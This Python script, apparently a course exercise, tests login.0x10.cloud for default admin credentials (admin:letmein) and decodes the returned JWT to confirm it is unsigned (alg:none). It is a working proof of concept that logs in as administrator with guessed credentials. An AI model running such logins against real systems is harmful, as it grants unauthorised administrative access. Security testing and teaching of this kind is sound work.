# ============================================================
#  VULNERABILITY: Default Admin Credentials Return Unsigned JWT
#  Target: login.0x10.cloud
#  Author: [Phillip Onofua]
# ============================================================

# Default credentials are usernames and passwords that are easy
# to guess or left unchanged from setup. JWT "alg:none" is also
# insecure because it means the token is not cryptographically
# signed.
#
# This allows attackers to:
# - Log in as an administrator using known weak credentials
# - Receive an administrator JWT token
# - See that the token header uses "alg":"none"
# - Potentially tamper with tokens if the server accepts unsigned JWTs
#
# In this case, login.0x10.cloud accepts admin:letmein and returns
# an administrator role with a JWT token whose decoded header is:
# {"alg":"none"}.
#
# Technique:
# Send a POST request to the login form using Python's standard
# library, parse the JSON response, decode the JWT header and
# payload, then report the vulnerability when the admin login
# succeeds and the JWT algorithm is "none".
# ============================================================

import base64
import json
import time
import urllib.parse
import urllib.request


print("=" * 50)
print("  Default Admin JWT Tester")
print("=" * 50)

# --- Configuration ---
target = "http://login.0x10.cloud/"
username = "admin"
password = "letmein"


def decode_jwt_part(encoded_part):
    # JWT parts use base64url encoding without required padding.
    padding = "=" * (-len(encoded_part) % 4)
    decoded = base64.urlsafe_b64decode(encoded_part + padding)
    return json.loads(decoded.decode("utf-8"))


print(f"\n  [1] Testing {target} for default admin credentials...")

try:
    time.sleep(0.15)  # respect server rate limit

    form_data = urllib.parse.urlencode(
        {
            "username": username,
            "password": password,
        }
    ).encode()

    request = urllib.request.Request(
        target,
        data=form_data,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "COMP2152-login-check",
        },
    )

    response = urllib.request.urlopen(request, timeout=5)
    response_text = response.read().decode("utf-8")
    login_result = json.loads(response_text)

    print(f"      [-] HTTP status: {response.status}")
    print(f"      [-] Username tested: {username}")
    print(f"      [-] Login status: {login_result.get('status')}")
    print(f"      [-] Returned role: {login_result.get('role')}")

    token = login_result.get("token", "")

    if token:
        header_part, payload_part, _signature_part = token.split(".")
        jwt_header = decode_jwt_part(header_part)
        jwt_payload = decode_jwt_part(payload_part)

        print(f"      [-] JWT token: {token}")
        print(f"      [-] Decoded JWT header: {jwt_header}")
        print(f"      [-] Decoded JWT payload: {jwt_payload}")
    else:
        jwt_header = {}
        jwt_payload = {}
        print("      [-] No JWT token returned.")

    default_login_works = (
        login_result.get("status") == "success"
        and login_result.get("user") == username
        and login_result.get("role") == "administrator"
    )
    unsigned_jwt = jwt_header.get("alg") == "none"

    if default_login_works and unsigned_jwt:
        print("\n  [!] VULNERABILITY FOUND")
        print("      [-] Default admin credentials admin:letmein are accepted.")
        print("      [-] The response returns an administrator role.")
        print("      [-] The issued JWT uses alg:none and is unsigned.")
    else:
        print("\n  [OK] Default admin login with unsigned JWT was not confirmed.")

except Exception as error:
    print(f"\n  [ERROR] Request failed: {error}")

print("\n" + "=" * 50)
